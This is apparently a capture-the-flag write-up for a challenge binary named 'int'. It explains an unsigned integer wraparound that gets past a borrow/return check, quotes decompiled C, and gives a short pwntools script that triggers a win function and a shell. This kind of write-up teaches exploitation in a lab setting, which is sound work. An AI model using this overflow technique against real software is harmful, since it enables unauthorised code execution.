# int

## Solution

When this binary is run, we are provided a random number and we are asked to provide two numbers: the number of instruments to borrow and the number to return. Here is an example of an execution of the binary:
```
<<< Return 114353 more instruments than you borrow
How many instruments would you like to borrow >>> 1
How many instruments would you like to return >>> 1
```
Thus, this makes it clear to us that we need to return more instruments than we borrow. There is an issue that arrises if we try to do this:
```
How many instruments would you like to borrow >>> 1
How many instruments would you like to return >>> 2
<<< You may not return more instruments than you borrowed.
```
Thus, this task seems impossible. We need to look in the binary to understand what it is doing. We first note that it takes our inputs and converts them into unsigned long values:
```C
int32_t rax_10 = strtoul(&var_e8, nullptr, 0xa);
...
int32_t rax_14 = strtoul(&var_78, nullptr, 0xa);
```
Next, in order to check if too many items are being returned, a simple if statement is used:
```C
if (rax_10 < rax_14)
{
    printf("<<< You may not return more instâ€¦");
    exit(0);
    /* no return */
}
```
Finally, in order to win, the difference between the two numbers must be equal to the random number provided.
```C
int32_t rax_17 = (rax_14 - rax_10);
...
if (rax_17 == rax_2)
{
    win();
}
```
It initially seems impossible for it to be true that `rax_14 <= rax_10` and `rax_14 - rax_10 > 0`. This is until we notice that these values are unsigned longs! Thus, if we set `rax_14` to zero and set `rax_10` to be the 2's complement of the random number, the unsigned long will wrap around and give us the number that we are looking for! This, can be done using the following Python code:
```python
p = start()
p.recvuntil(b"<<< Return ")
rand_val = int(p.recvuntil(b" ")[:-1])
log.info(f"Random value is given as {rand_val}")

p.sendlineafter(b"borrow >>>", str(0xffffffff - rand_val + 1).encode('utf-8'))
p.sendlineafter(b"return >>>", str(0).encode('utf-8'))
```
From this code, we get the win function to run and get a shell on the machine! 